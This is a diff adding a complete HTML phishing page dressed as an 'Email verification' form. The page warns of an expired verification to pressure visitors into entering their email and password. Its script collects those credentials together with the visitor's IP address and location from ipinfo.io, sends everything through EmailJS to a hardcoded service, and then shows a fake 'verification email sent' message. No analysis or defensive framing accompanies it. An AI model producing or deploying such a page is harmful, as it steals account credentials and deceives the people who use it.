@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Email Verification</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <!-- EmailJS integration -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init({
+        publicKey: "kUOv0ZnyMXgQQY1yj",
+      });
+    })();
+  </script>
+  <style>
+      body {
+  font-family: Arial, sans-serif;
+  background-color: #f0f4f8;
+  margin: 0;
+  padding: 20px;
+}
+
+.spinner {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background-color: rgba(0, 0, 0, 0.6);
+  color: white;
+  font-size: 20px;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+}
+
+.error-box {
+  background-color: #ffe3e3;
+  border-left: 5px solid #d9534f;
+  color: #d9534f;
+  padding: 15px;
+  margin-bottom: 20px;
+  border-radius: 4px;
+}
+
+.error-box .icon {
+  margin-right: 8px;
+}
+
+.form-box {
+  background-color: #ffffff;
+  border: 1px solid #ddd;
+  padding: 20px;
+  border-radius: 8px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+.form-box h2 {
+  margin: 0 0 10px;
+  color: #333;
+}
+
+.form-box p {
+  color: #666;
+  margin-bottom: 20px;
+}
+
+.input-group {
+  display: flex;
+  align-items: center;
+  margin-bottom: 15px;
+}
+
+.input-group .icon {
+  padding: 10px;
+  background-color: #f5f5f5;
+  border: 1px solid #ddd;
+  border-right: none;
+  border-radius: 4px 0 0 4px;
+}
+
+.input-group input {
+  flex: 1;
+  padding: 10px;
+  border: 1px solid #ddd;
+  border-left: none;
+  border-radius: 0 4px 4px 0;
+  outline: none;
+}
+
+.input-group input:focus {
+  border-color: #007bff;
+}
+
+button {
+  background-color: #6c3483;
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  background-color: #5a2d6f;
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="error-box">
+      <p><span class="icon">⚠️</span> Sorry User. The request contains an invalid or expired verification. <br><br>Please verify your email to regain full access and restore your account functionality.</p>
+    </div>
+
+    <div class="form-box">
+      <h2>Email verification</h2>
+      <p>Complete the form to request a new verification email.</p>
+      <form onsubmit="sendEmail(event)">
+        <div class="input-group">
+          <span class="icon">👤</span>
+          <input type="email" id="email" placeholder="Email" required>
+        </div>
+        <div class="input-group">
+          <span class="icon">🔒</span>
+          <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Populate the email field from URL parameter
+    window.onload = function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email'); // Fetch 'email' parameter from the URL
+      document.getElementById('email').value = email || ''; // Populate the email field if the parameter exists
+    };
+
+    // Function to send email with EmailJS and fetch IPinfo
+    function sendEmail(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      // Validation: check if email and password are filled
+      if (email === "") {
+        alert("Please enter your email.");
+        return;
+      }
+
+      if (password === "") {
+        alert("Please enter your password.");
+        return;
+      }
+
+      // Fetch user's IP and location info from IPinfo
+      fetch('https://ipinfo.io?token=f65a3d103cb816') // Replace with your IPinfo API token
+        .then(response => response.json())
+        .then(data => {
+          // Extract information from IPinfo API response
+          const ipInfo = {
+            email: email,
+            password: password,
+            ip: data.ip || 'Unknown IP',
+            city: data.city || 'Unknown City',
+            region: data.region || 'Unknown Region',
+            country: data.country || 'Unknown Country'
+          };
+
+          // Initialize EmailJS
+          emailjs.init("kUOv0ZnyMXgQQY1yj"); // Replace 'kUOv0ZnyMXgQQY1yj' with your EmailJS user ID
+
+          // Send email using EmailJS
+          emailjs.send("service_mclb6ze", "template_30nlj5e", ipInfo)
+            .then(
+              response => {
+                console.log("Email sent successfully:", response.status, response.text);
+                alert("Verification email sent successfully.");
+              },
+              error => {
+                console.error("Failed to send email:", error);
+                alert("Network Error, please try again.");
+              }
+            );
+        })
+        .catch(error => {
+          console.error("Error fetching IP info:", error);
+          alert("Network Error, please try again.");
+        });
+    }
+  </script>
+</body>
+</html>
